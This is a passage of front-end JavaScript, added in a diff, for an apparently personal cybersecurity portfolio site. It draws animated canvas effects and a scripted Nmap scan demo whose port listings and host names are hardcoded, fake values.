+  {t:'Establishing secure channel...',c:'ok',delay:300},
+  {t:'System ready. Welcome, Marcus.',c:'ok',delay:100},
+];
+
+let bootDone = false;
+function runBoot(){
+  const container = document.getElementById('boot-lines');
+  const bar = document.getElementById('boot-bar-fill');
+  let i = 0;
+  function next(){
+    if(i >= bootLines.length){
+      setTimeout(()=>{
+        const boot = document.getElementById('boot');
+        boot.style.transition='opacity .8s';
+        boot.style.opacity='0';
+        setTimeout(()=>{boot.style.display='none';bootDone=true;initAll();},800);
+      },400);
+      return;
+    }
+    const l = bootLines[i];
+    const div = document.createElement('div');
+    div.className='boot-line'+(l.c?' '+l.c:'');
+    div.textContent = l.t;
+    container.appendChild(div);
+    requestAnimationFrame(()=>div.style.opacity='1');
+    bar.style.width = ((i+1)/bootLines.length*100)+'%';
+    i++;
+    setTimeout(next, l.delay + Math.random()*100);
+  }
+  next();
+}
+runBoot();
+
+// ============================================================
+// GLOBAL INIT
+// ============================================================
+function initAll(){
+  initCursor();
+  initGridCanvas();
+  initParticles();
+  initDataStreams();
+  counterAnimate('stat-vulns',12,1200);
+  counterAnimate('stat-orgs',5,1000);
+  counterAnimate('stat-tools',40,1500);
+  counterAnimate('stat-yrs',2,800);
+  initScrollReveal();
+  initPreviewAnimations();
+  initSkillBars();
+  initNavClock();
+}
+
+// ============================================================
+// CUSTOM CURSOR
+// ============================================================
+function initCursor(){
+  const cur = document.getElementById('cursor');
+  const dot = document.getElementById('cursorDot');
+  let mx=0,my=0,cx=0,cy=0;
+  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;dot.style.left=mx+'px';dot.style.top=my+'px';});
+  document.addEventListener('mousedown',()=>cur.classList.add('active'));
+  document.addEventListener('mouseup',()=>cur.classList.remove('active'));
+  function anim(){cx+=(mx-cx)*.12;cy+=(my-cy)*.12;cur.style.left=cx+'px';cur.style.top=cy+'px';requestAnimationFrame(anim);}
+  anim();
+}
+
+// ============================================================
+// GRID CANVAS
+// ============================================================
+function initGridCanvas(){
+  const c = document.getElementById('grid-canvas');
+  const ctx = c.getContext('2d');
+  function resize(){c.width=innerWidth;c.height=innerHeight;}
+  resize();
+  window.addEventListener('resize',resize);
+  let offset=0;
+  function draw(){
+    ctx.clearRect(0,0,c.width,c.height);
+    ctx.strokeStyle='rgba(0,100,150,0.07)';
+    ctx.lineWidth=1;
+    const gs=40;
+    for(let x=0;x<c.width;x+=gs){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,c.height);ctx.stroke();}
+    for(let y=offset%gs;y<c.height;y+=gs){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(c.width,y);ctx.stroke();}
+    offset+=0.3;
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+// ============================================================
+// HERO PARTICLES
+// ============================================================
+function initParticles(){
+  const c = document.getElementById('particle-canvas');
+  if(!c)return;
+  const ctx = c.getContext('2d');
+  function resize(){c.width=c.parentElement.offsetWidth;c.height=c.parentElement.offsetHeight;}
+  resize();
+  const pts=[];
+  for(let i=0;i<60;i++) pts.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:Math.random()*2+1,a:Math.random()});
+  function draw(){
+    ctx.clearRect(0,0,c.width,c.height);
+    pts.forEach(p=>{
+      p.x+=p.vx;p.y+=p.vy;
+      if(p.x<0||p.x>c.width)p.vx*=-1;
+      if(p.y<0||p.y>c.height)p.vy*=-1;
+      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+      ctx.fillStyle=`rgba(0,212,255,${p.a*.6})`;ctx.fill();
+    });
+    pts.forEach((a,i)=>pts.slice(i+1).forEach(b=>{
+      const d=Math.hypot(a.x-b.x,a.y-b.y);
+      if(d<100){ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=`rgba(0,212,255,${.3*(1-d/100)})`;ctx.lineWidth=.5;ctx.stroke();}
+    }));
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+// ============================================================
+// DATA STREAMS
+// ============================================================
+function initDataStreams(){
+  const c=document.getElementById('data-streams');
+  if(!c)return;
+  for(let i=0;i<12;i++){
+    const s=document.createElement('div');
+    s.style.cssText=`position:absolute;top:0;left:${Math.random()*100}%;width:1px;background:linear-gradient(180deg,transparent,rgba(0,212,255,.3),transparent);height:${60+Math.random()*100}px;animation:dataStream ${3+Math.random()*4}s linear ${Math.random()*5}s infinite;`;
+    c.appendChild(s);
+  }
+}
+
+// ============================================================
+// COUNTER
+// ============================================================
+function counterAnimate(id,target,dur){
+  const el=document.getElementById(id);
+  if(!el)return;
+  const step=target/(dur/16);
+  let v=0;
+  const t=setInterval(()=>{v+=step;if(v>=target){v=target;clearInterval(t);}el.textContent=Math.round(v)+(id==='stat-tools'?'+':'');},16);
+}
+
+// ============================================================
+// SCROLL REVEAL
+// ============================================================
+function initScrollReveal(){
+  const obs=new IntersectionObserver(entries=>{
+    entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('visible');if(e.target.querySelectorAll('.skill-fill').length)animateSkillBarsIn(e.target);}});
+  },{threshold:.1});
+  document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+}
+
+// ============================================================
+// SKILL BARS
+// ============================================================
+function initSkillBars(){}
+function animateSkillBarsIn(container){
+  container.querySelectorAll('.skill-fill').forEach(b=>{
+    setTimeout(()=>{b.style.width=(b.dataset.w||'80')+'%';},100+Math.random()*300);
+  });
+}
+function switchTab(id){
+  document.querySelectorAll('.skill-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  event.target.classList.add('active');
+  setTimeout(()=>{
+    document.querySelectorAll('#tab-'+id+' .skill-fill').forEach(b=>{b.style.width=(b.dataset.w||'80')+'%';});
+  },100);
+}
+
+// ============================================================
+// NAV CLOCK
+// ============================================================
+function initNavClock(){
+  const el=document.getElementById('nav-status');
+  setInterval(()=>{
+    const now=new Date();
+    el.textContent=`SECURE // ${now.toLocaleTimeString('en-GB')}`;
+  },1000);
+}
+
+// ============================================================
+// PREVIEW ANIMATIONS
+// ============================================================
+function initPreviewAnimations(){
+  previewNmap();
+  previewSOC();
+  previewBurp();
+  previewTor();
+  previewOsint();
+  previewForensics();
+}
+
+function previewNmap(){
+  const c=document.getElementById('nmap-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const nodes=[];
+  const cx2=c.width/2,cy2=c.height/2;
+  // create ring of hosts
+  for(let i=0;i<8;i++){
+    const a=(i/8)*Math.PI*2;
+    const r=60+Math.random()*30;
+    nodes.push({x:cx2+Math.cos(a)*r,y:cy2+Math.sin(a)*r,open:Math.random()>.4,scanned:false,pulse:0,label:'192.168.'+i+'.1'});
+  }
+  nodes.push({x:cx2,y:cy2,open:true,scanned:true,pulse:0,label:'ATTACKER',center:true});
+  let scanIdx=0,tick=0;
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.15)';ctx.fillRect(0,0,c.width,c.height);
+    tick++;
+    if(tick%40===0 && scanIdx<nodes.length-1){nodes[scanIdx].scanned=true;scanIdx++;}
+    // draw lines
+    nodes.forEach((n,i)=>{
+      if(i===nodes.length-1)return;
+      if(n.scanned){
+        ctx.beginPath();ctx.moveTo(cx2,cy2);ctx.lineTo(n.x,n.y);
+        ctx.strokeStyle=n.open?'rgba(0,255,136,.15)':'rgba(255,56,96,.15)';ctx.lineWidth=1;ctx.stroke();
+      }
+    });
+    // scan pulse
+    if(scanIdx<nodes.length-1){
+      const sn=nodes[scanIdx];
+      const prog=(tick%40)/40;
+      ctx.beginPath();ctx.moveTo(cx2,cy2);
+      const ex=cx2+(sn.x-cx2)*prog,ey=cy2+(sn.y-cy2)*prog;
+      ctx.lineTo(ex,ey);ctx.strokeStyle='rgba(0,212,255,.8)';ctx.lineWidth=1.5;ctx.stroke();
+      ctx.beginPath();ctx.arc(ex,ey,3,0,Math.PI*2);ctx.fillStyle='#00d4ff';ctx.fill();
+    }
+    // nodes
+    nodes.forEach((n,i)=>{
+      n.pulse=(n.pulse+.05)%Math.PI;
+      const pulsed=n.center?'#00d4ff':n.scanned?(n.open?'#00ff88':'#ff3860'):'#0e4a6e';
+      if(n.scanned||n.center){
+        ctx.beginPath();ctx.arc(n.x,n.y,8+Math.sin(n.pulse)*2,0,Math.PI*2);
+        ctx.fillStyle=pulsed+'22';ctx.fill();
+      }
+      ctx.beginPath();ctx.arc(n.x,n.y,5,0,Math.PI*2);ctx.fillStyle=pulsed;ctx.fill();
+      ctx.font='8px Share Tech Mono';ctx.fillStyle='rgba(184,220,237,.6)';ctx.textAlign='center';
+      ctx.fillText(n.center?n.label:'',n.x,n.y-10);
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function previewSOC(){
+  const c=document.getElementById('soc-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const alerts=[];
+  const colors=['#ff3860','#ff6b35','#b060ff','#00ff88','#3d7a99'];
+  const labels=['CRIT','HIGH','MED','LOW','INFO'];
+  let tick=0;
+  function addAlert(){
+    if(alerts.length>20)alerts.shift();
+    const t=Math.floor(Math.random()*5);
+    alerts.push({y:-10,color:colors[t],label:labels[t],msg:['Brute force SSH','SQL injection attempt','Port scan detected','Honeypot triggered','Config change'][Math.floor(Math.random()*5)],speed:.5+Math.random()*.5});
+  }
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.2)';ctx.fillRect(0,0,c.width,c.height);
+    tick++;
+    if(tick%30===0)addAlert();
+    alerts.forEach(a=>{
+      a.y+=a.speed;
+      ctx.fillStyle=a.color+'22';ctx.fillRect(0,a.y,c.width,14);
+      ctx.fillStyle=a.color;ctx.font='bold 8px Share Tech Mono';ctx.textAlign='left';ctx.fillText('['+a.label+']',5,a.y+10);
+      ctx.fillStyle='rgba(184,220,237,.7)';ctx.font='8px Share Tech Mono';ctx.fillText(a.msg,55,a.y+10);
+      const now=new Date();ctx.fillStyle='rgba(61,122,153,.7)';ctx.textAlign='right';ctx.fillText(now.toLocaleTimeString(),c.width-5,a.y+10);
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function previewBurp(){
+  const c=document.getElementById('burp-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const packets=[];
+  let tick=0;
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.15)';ctx.fillRect(0,0,c.width,c.height);
+    tick++;
+    if(tick%15===0){
+      const going=Math.random()>.4;
+      packets.push({x:going?0:c.width,dir:going?1:-1,y:20+Math.random()*(c.height-40),color:going?'#00ff88':'#ff6b35',label:going?'GET /api/login HTTP/1.1':'HTTP/1.1 '+(Math.random()>.7?'403 Forbidden':'200 OK'),speed:1.5+Math.random()*2});
+    }
+    // draw server/client
+    ctx.fillStyle='#0e4a6e';
+    ctx.fillRect(10,c.height/2-20,50,40);ctx.fillRect(c.width-60,c.height/2-20,50,40);
+    ctx.fillStyle='#00d4ff';ctx.font='8px Share Tech Mono';ctx.textAlign='center';
+    ctx.fillText('CLIENT',35,c.height/2+4);ctx.fillText('SERVER',c.width-35,c.height/2+4);
+    // BURP intercept box in middle
+    ctx.fillStyle='rgba(176,96,255,.08)';ctx.fillRect(c.width/2-40,c.height/2-18,80,36);
+    ctx.strokeStyle='rgba(176,96,255,.4)';ctx.strokeRect(c.width/2-40,c.height/2-18,80,36);
+    ctx.fillStyle='#b060ff';ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';
+    ctx.fillText('BURP',c.width/2,c.height/2-4);ctx.fillText('INTERCEPT',c.width/2,c.height/2+8);
+    packets.forEach((p,i)=>{
+      p.x+=p.dir*p.speed;
+      if(p.x<-200||p.x>c.width+200)packets.splice(i,1);
+      ctx.beginPath();ctx.arc(p.x,p.y,4,0,Math.PI*2);ctx.fillStyle=p.color;ctx.fill();
+      ctx.fillStyle=p.color+'99';ctx.font='7px Share Tech Mono';ctx.textAlign=p.dir>0?'left':'right';
+      ctx.fillText(p.label,p.x+(p.dir>0?8:-8),p.y-6);
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function previewTor(){
+  const c=document.getElementById('tor-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const nodes=[];
+  const nCount=7;
+  for(let i=0;i<nCount;i++){nodes.push({x:50+Math.random()*(c.width-100),y:30+Math.random()*(c.height-60),label:['GUARD','RELAY','EXIT','RELAY','GUARD','EXIT','RELAY'][i]});}
+  nodes[0].x=30;nodes[0].y=c.height/2;nodes[nCount-1].x=c.width-30;nodes[nCount-1].y=c.height/2;
+  let path=[0,1,2,4,nCount-1],tick=0,packetPos=0;
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.2)';ctx.fillRect(0,0,c.width,c.height);
+    tick++;
+    // connections
+    for(let i=0;i<path.length-1;i++){
+      const a=nodes[path[i]],b=nodes[path[i+1]];
+      ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);
+      ctx.strokeStyle='rgba(0,255,136,.2)';ctx.lineWidth=1.5;ctx.stroke();
+    }
+    // nodes
+    nodes.forEach((n,i)=>{
+      const inPath=path.includes(i);
+      ctx.beginPath();ctx.arc(n.x,n.y,inPath?8:5,0,Math.PI*2);
+      ctx.fillStyle=inPath?'rgba(0,255,136,.15)':'rgba(14,74,110,.3)';ctx.fill();
+      ctx.beginPath();ctx.arc(n.x,n.y,inPath?8:5,0,Math.PI*2);
+      ctx.strokeStyle=inPath?'#00ff88':'#0e4a6e';ctx.lineWidth=1;ctx.stroke();
+      ctx.fillStyle=inPath?'#00ff88':'#3d7a99';ctx.font='7px Share Tech Mono';ctx.textAlign='center';
+      ctx.fillText(n.label,n.x,n.y-12);
+    });
+    // animated packet
+    const seg=Math.floor(packetPos);
+    if(seg<path.length-1){
+      const frac=packetPos-seg;
+      const a=nodes[path[seg]],b=nodes[path[seg+1]];
+      const px=a.x+(b.x-a.x)*frac,py=a.y+(b.y-a.y)*frac;
+      ctx.beginPath();ctx.arc(px,py,5,0,Math.PI*2);
+      ctx.fillStyle='#ff6b35';ctx.fill();
+      ctx.beginPath();ctx.arc(px,py,10,0,Math.PI*2);
+      ctx.strokeStyle='rgba(255,107,53,.3)';ctx.lineWidth=2;ctx.stroke();
+    }
+    packetPos+=(path.length-1)/(60*3);
+    if(packetPos>=path.length-1)packetPos=0;
+    // labels
+    ctx.fillStyle='rgba(0,255,136,.7)';ctx.font='8px Share Tech Mono';ctx.textAlign='left';
+    ctx.fillText('🔒 TOR CIRCUIT ACTIVE',8,14);
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function previewOsint(){
+  const c=document.getElementById('osint-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const center={x:c.width/2,y:c.height/2};
+  const satellites=[
+    {label:'DNS Records',color:'#00d4ff',angle:0,dist:70},{label:'WHOIS',color:'#00ff88',angle:.8,dist:60},
+    {label:'Emails',color:'#ff6b35',angle:1.8,dist:75},{label:'LinkedIn',color:'#b060ff',angle:2.8,dist:65},
+    {label:'Shodan',color:'#ff3860',angle:3.8,dist:70},{label:'GitHub',color:'#00ff88',angle:4.8,dist:60},
+    {label:'IP Range',color:'#00d4ff',angle:5.5,dist:68}
+  ];
+  let tick=0;
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.15)';ctx.fillRect(0,0,c.width,c.height);
+    tick+=.01;
+    satellites.forEach(s=>{
+      s.angle+=.008;
+      const x=center.x+Math.cos(s.angle)*s.dist,y=center.y+Math.sin(s.angle)*s.dist*.6;
+      ctx.beginPath();ctx.moveTo(center.x,center.y);ctx.lineTo(x,y);
+      ctx.strokeStyle=s.color+'33';ctx.lineWidth=1;ctx.stroke();
+      ctx.beginPath();ctx.arc(x,y,5,0,Math.PI*2);ctx.fillStyle=s.color+'44';ctx.fill();
+      ctx.beginPath();ctx.arc(x,y,5,0,Math.PI*2);ctx.strokeStyle=s.color;ctx.lineWidth=1;ctx.stroke();
+      ctx.fillStyle=s.color;ctx.font='7px Share Tech Mono';ctx.textAlign='center';
+      ctx.fillText(s.label,x,y-9);
+    });
+    // target
+    ctx.beginPath();ctx.arc(center.x,center.y,12,0,Math.PI*2);
+    ctx.fillStyle='rgba(255,56,96,.1)';ctx.fill();
+    ctx.beginPath();ctx.arc(center.x,center.y,12,0,Math.PI*2);
+    ctx.strokeStyle='#ff3860';ctx.lineWidth=2;ctx.stroke();
+    ctx.fillStyle='#ff3860';ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';
+    ctx.fillText('TARGET',center.x,center.y+3);
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+function previewForensics(){
+  const c=document.getElementById('forensics-preview-canvas');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.parentElement.offsetWidth;c.height=200;
+  const sectors=[];
+  const w=Math.floor(c.width/10),cols=w,rows=Math.floor(c.height/14);
+  const hexChars='0123456789ABCDEF';
+  for(let r=0;r<rows;r++)for(let col=0;col<cols;col++)
+    sectors.push({x:col*10,y:r*14,v:hexChars[Math.floor(Math.random()*16)]+hexChars[Math.floor(Math.random()*16)],color:Math.random()>.85?'#00d4ff':Math.random()>.95?'#00ff88':'#1a3a4a',flash:0});
+  const scanner={y:0,dir:1};
+  function draw(){
+    ctx.fillStyle='#000';ctx.fillRect(0,0,c.width,c.height);
+    scanner.y+=scanner.dir*.8;
+    if(scanner.y>c.height||scanner.y<0)scanner.dir*=-1;
+    sectors.forEach(s=>{
+      const inScan=Math.abs(s.y-scanner.y)<10;
+      if(inScan&&Math.random()>.8){s.v=hexChars[Math.floor(Math.random()*16)]+hexChars[Math.floor(Math.random()*16)];if(Math.random()>.9)s.color='#00ff88';else if(Math.random()>.95)s.color='#ff3860';}
+      if(s.flash>0)s.flash--;
+      ctx.fillStyle=inScan?'#fff':(s.flash>0?s.color+'ff':s.color);
+      ctx.font='9px Share Tech Mono';ctx.fillText(s.v,s.x,s.y+10);
+    });
+    // scanner line
+    const g=ctx.createLinearGradient(0,scanner.y-10,0,scanner.y+10);
+    g.addColorStop(0,'transparent');g.addColorStop(.5,'rgba(0,212,255,.15)');g.addColorStop(1,'transparent');
+    ctx.fillStyle=g;ctx.fillRect(0,scanner.y-10,c.width,20);
+    ctx.beginPath();ctx.moveTo(0,scanner.y);ctx.lineTo(c.width,scanner.y);
+    ctx.strokeStyle='rgba(0,212,255,.6)';ctx.lineWidth=1;ctx.stroke();
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
+// ============================================================
+// SIMULATIONS (MODAL)
+// ============================================================
+function openSim(type){
+  const modal=document.getElementById('sim-modal');
+  const body=document.getElementById('modal-body');
+  const title=document.getElementById('modal-title');
+  modal.classList.add('open');
+  if(type==='nmap'){title.textContent='// NMAP — NETWORK MAPPER SIMULATION';body.innerHTML=buildNmapSim();setTimeout(runNmapSim,200);}
+  else if(type==='soc'){title.textContent='// HOMELAB SOC DASHBOARD — WAZUH + ZEEK + n8n';body.innerHTML=buildSOCSim();setTimeout(runSOCSim,200);}
+  else if(type==='burp'){title.textContent='// BURP SUITE — HTTP INTERCEPT & SQLi SIMULATION';body.innerHTML=buildBurpSim();setTimeout(runBurpSim,200);}
+  else if(type==='tor'){title.textContent='// SECURE COMMS — TOR OPSEC SIMULATION';body.innerHTML=buildTorSim();setTimeout(runTorSim,200);}
+  else if(type==='osint'){title.textContent='// OSINT FRAMEWORK — INTELLIGENCE GATHERING';body.innerHTML=buildOsintSim();setTimeout(runOsintSim,200);}
+  else if(type==='forensics'){title.textContent='// DIGITAL FORENSICS LAB — EVIDENCE ANALYSIS';body.innerHTML=buildForensicsSim();setTimeout(runForensicsSim,200);}
+}
+function closeSim(){
+  document.getElementById('sim-modal').classList.remove('open');
+  document.getElementById('modal-body').innerHTML='';
+}
+
+// ─── NMAP SIM ────────────────────────────────────────
+function buildNmapSim(){
+  return `
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;">
+  <div>
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:.8rem;">// TARGET CONFIGURATION</div>
+    <div style="display:flex;flex-direction:column;gap:.5rem;margin-bottom:1rem;">
+      <div style="display:flex;gap:.5rem;align-items:center;">
+        <span style="font-family:var(--mono);font-size:.65rem;color:var(--dim);min-width:60px;">TARGET</span>
+        <input id="nmap-target" value="192.168.1.0/24" style="flex:1;background:#000;border:1px solid var(--border);color:var(--c1);font-family:var(--mono);font-size:.7rem;padding:.4rem .6rem;outline:none;">
+      </div>
+      <div style="display:flex;gap:.5rem;align-items:center;">
+        <span style="font-family:var(--mono);font-size:.65rem;color:var(--dim);min-width:60px;">SCAN TYPE</span>
+        <select id="nmap-type" style="flex:1;background:#000;border:1px solid var(--border);color:var(--c1);font-family:var(--mono);font-size:.7rem;padding:.4rem .6rem;outline:none;">
+          <option value="sS">-sS SYN Stealth Scan</option>
+          <option value="sV">-sV Service Detection</option>
+          <option value="sA">-sA ACK Scan</option>
+          <option value="O">-O OS Detection</option>
+          <option value="A">-A Aggressive Scan</option>
+        </select>
+      </div>
+      <div style="display:flex;gap:.5rem;align-items:center;">
+        <span style="font-family:var(--mono);font-size:.65rem;color:var(--dim);min-width:60px;">PORTS</span>
+        <input id="nmap-ports" value="1-1000" style="flex:1;background:#000;border:1px solid var(--border);color:var(--c1);font-family:var(--mono);font-size:.7rem;padding:.4rem .6rem;outline:none;">
+      </div>
+    </div>
+    <button onclick="runNmapScan()" id="nmap-run-btn" class="tc-btn" style="width:100%;padding:.6rem;font-size:.7rem;">▶ EXECUTE SCAN</button>
+    <div style="margin-top:1rem;font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:.5rem;">// SCAN PROGRESS</div>
+    <div class="scan-bar"><div class="scan-progress" id="nmap-prog"></div></div>
+    <div id="nmap-status" style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-top:.3rem;">READY</div>
+    <div style="margin-top:1rem;">
+      <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);margin-bottom:.5rem;">// DISCOVERED HOSTS</div>
+      <canvas id="nmap-topology" style="width:100%;height:160px;background:#000;border:1px solid var(--border);"></canvas>
+    </div>
+  </div>
+  <div>
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:.5rem;">// TERMINAL OUTPUT</div>
+    <div class="terminal" id="nmap-term" style="height:460px;">
+      <div class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd" id="nmap-cmd-display"></span><span class="t-cursor" id="nmap-cursor"></span></div>
+    </div>
+  </div>
+</div>`;
+}
+
+let nmapInterval=null;
+function runNmapSim(){
+  const topology=document.getElementById('nmap-topology');
+  if(!topology)return;
+  const ctx=topology.getContext('2d');
+  topology.width=topology.offsetWidth;topology.height=160;
+  function draw(){
+    ctx.fillStyle='#000';ctx.fillRect(0,0,topology.width,topology.height);
+    ctx.fillStyle='rgba(0,212,255,.4)';ctx.font='7px Share Tech Mono';ctx.textAlign='center';
+    ctx.fillText('CLICK ▶ EXECUTE SCAN TO MAP NETWORK',topology.width/2,topology.height/2);
+  }
+  draw();
+}
+
+function runNmapScan(){
+  const target=document.getElementById('nmap-target').value||'192.168.1.0/24';
+  const scanType=document.getElementById('nmap-type').value;
+  const ports=document.getElementById('nmap-ports').value||'1-1000';
+  const term=document.getElementById('nmap-term');
+  const prog=document.getElementById('nmap-prog');
+  const status=document.getElementById('nmap-status');
+  const cmdDisplay=document.getElementById('nmap-cmd-display');
+  const cursor=document.getElementById('nmap-cursor');
+  const cmd=`nmap -${scanType} -p ${ports} ${target}`;
+  term.innerHTML='';
+  prog.style.width='0';
+  cursor.style.display='none';
+  // type command
+  let ci=0;
+  const typing=setInterval(()=>{
+    if(ci<=cmd.length){cmdDisplay?cmdDisplay.textContent=cmd.slice(0,ci):'';ci++;}
+    else{clearInterval(typing);startScan();}
+  },40);
+  const promptLine=document.createElement('div');
+  promptLine.className='t-line';
+  promptLine.innerHTML=`<span class="t-prompt">root@kali:~# </span><span class="t-cmd" id="nmap-cmd-display"></span><span class="t-cursor" id="nmap-cursor">█</span>`;
+  term.appendChild(promptLine);
+  function startScan(){
+    document.getElementById('nmap-run-btn').classList.add('running');
+    document.getElementById('nmap-run-btn').textContent='● SCANNING...';
+    function addLine(html,delay){setTimeout(()=>{const d=document.createElement('div');d.className='t-line';d.innerHTML=html;term.appendChild(d);term.scrollTop=term.scrollHeight;},delay);}
+    addLine(`<span class="t-info">Starting Nmap 7.94 at ${new Date().toLocaleDateString()}</span>`,200);
+    addLine(`<span class="t-info">Nmap scan report for ${target}</span>`,600);
+    addLine('<span class="t-success">Host is up (0.0012s latency).</span>',900);
+    const hosts=[
+      {ip:'192.168.1.1',hostname:'router.local',os:'Linux 4.x',ports:[{n:22,s:'open',svc:'ssh',v:'OpenSSH 8.9p1'},{n:80,s:'open',svc:'http',v:'nginx 1.22.0'},{n:443,s:'open',svc:'https',v:'nginx 1.22.0'}]},
+      {ip:'192.168.1.10',hostname:'webserver.local',os:'Ubuntu 22.04',ports:[{n:80,s:'open',svc:'http',v:'Apache 2.4.52'},{n:443,s:'open',svc:'https',v:'Apache 2.4.52'},{n:3306,s:'open',svc:'mysql',v:'MySQL 8.0.31'},{n:22,s:'open',svc:'ssh',v:'OpenSSH 8.9'},{n:8080,s:'filtered',svc:'http-proxy',v:'?'}]},
+      {ip:'192.168.1.25',hostname:'win-workstation.local',os:'Windows 10',ports:[{n:135,s:'open',svc:'msrpc',v:'Microsoft RPC'},{n:139,s:'open',svc:'netbios-ssn',v:'Samba'},{n:445,s:'open',svc:'microsoft-ds',v:'Windows SMBv2'},{n:3389,s:'open',svc:'rdp',v:'xrdp 0.9.17'}]},
+      {ip:'192.168.1.50',hostname:'nas.local',os:'Linux embedded',ports:[{n:21,s:'open',svc:'ftp',v:'vsftpd 3.0.5'},{n:80,s:'open',svc:'http',v:'lighttpd 1.4.67'},{n:111,s:'open',svc:'rpcbind',v:'2-4 (RPC #100000)'},{n:2049,s:'open',svc:'nfs',v:'2-4'}]},
+    ];
+    let delay=1200;
+    hosts.forEach((h,hi)=>{
+      addLine(`<br><span class="t-success">Nmap scan report for ${h.hostname} (${h.ip})</span>`,delay);
+      addLine(`<span class="t-success">Host is up (${(Math.random()*.005).toFixed(4)}s latency).</span>`,delay+200);
+      addLine(`<span class="t-out">Not shown: ${1000-h.ports.length} closed tcp ports (reset)</span>`,delay+300);
+      addLine(`<span class="t-info">PORT      STATE    SERVICE    VERSION</span>`,delay+400);
+      h.ports.forEach((p,pi)=>{
+        const stateColor=p.s==='open'?'t-success':p.s==='filtered'?'t-warn':'t-err';
+        addLine(`<span class="${stateColor}">${String(p.n+'/tcp').padEnd(10)}${p.s.padEnd(9)}${p.svc.padEnd(11)}${p.v}</span>`,delay+500+pi*150);
+      });
+      if(scanType==='O'||scanType==='A'||scanType==='sV'){
+        addLine(`<span class="t-info">OS: ${h.os}</span>`,delay+500+h.ports.length*150+100);
+      }
+      delay+=600+h.ports.length*150;
+      const pct=Math.round((hi+1)/hosts.length*100);
+      setTimeout(()=>{prog.style.width=pct+'%';status.textContent=`Scanning... ${pct}%`;},delay-400);
+    });
+    addLine(`<br><span class="t-success">Nmap done: 4 IP addresses (4 hosts up) scanned in ${(12+Math.random()*8).toFixed(2)} seconds</span>`,delay);
+    addLine(`<span class="t-warn">⚠ Notable: 192.168.1.10 has MySQL exposed — possible attack vector</span>`,delay+200);
+    addLine(`<span class="t-warn">⚠ Notable: 192.168.1.25 has RDP exposed — brute-force risk</span>`,delay+400);
+    addLine(`<span class="t-warn">⚠ Notable: 192.168.1.50 has NFS share — check export permissions</span>`,delay+600);
+    setTimeout(()=>{
+      prog.style.width='100%';status.textContent='SCAN COMPLETE — 4 hosts discovered';
+      document.getElementById('nmap-run-btn').classList.remove('running');
+      document.getElementById('nmap-run-btn').textContent='▶ RUN AGAIN';
+      drawTopology(hosts);
+    },delay+700);
+  }
+}
+
+function drawTopology(hosts){
+  const c=document.getElementById('nmap-topology');
+  if(!c)return;
+  const ctx=c.getContext('2d');
+  c.width=c.offsetWidth;c.height=160;
+  const center={x:c.width/2,y:c.height/2};
+  const angles=hosts.map((_,i)=>i/hosts.length*Math.PI*2);
+  const r=55;
+  // draw connections
+  hosts.forEach((_,i)=>{
+    const x=center.x+Math.cos(angles[i])*r,y=center.y+Math.sin(angles[i])*r*.7;
+    ctx.beginPath();ctx.moveTo(center.x,center.y);ctx.lineTo(x,y);
+    ctx.strokeStyle='rgba(0,212,255,.3)';ctx.lineWidth=1;ctx.stroke();
+  });
+  // attacker
+  ctx.beginPath();ctx.arc(center.x,center.y,10,0,Math.PI*2);
+  ctx.fillStyle='rgba(255,56,96,.2)';ctx.fill();
+  ctx.strokeStyle='#ff3860';ctx.lineWidth=2;ctx.stroke();
+  ctx.fillStyle='#ff3860';ctx.font='bold 7px Share Tech Mono';ctx.textAlign='center';ctx.fillText('KALI',center.x,center.y+3);
+  // hosts
+  hosts.forEach((h,i)=>{
+    const x=center.x+Math.cos(angles[i])*r,y=center.y+Math.sin(angles[i])*r*.7;
+    ctx.beginPath();ctx.arc(x,y,8,0,Math.PI*2);
+    ctx.fillStyle='rgba(0,255,136,.15)';ctx.fill();
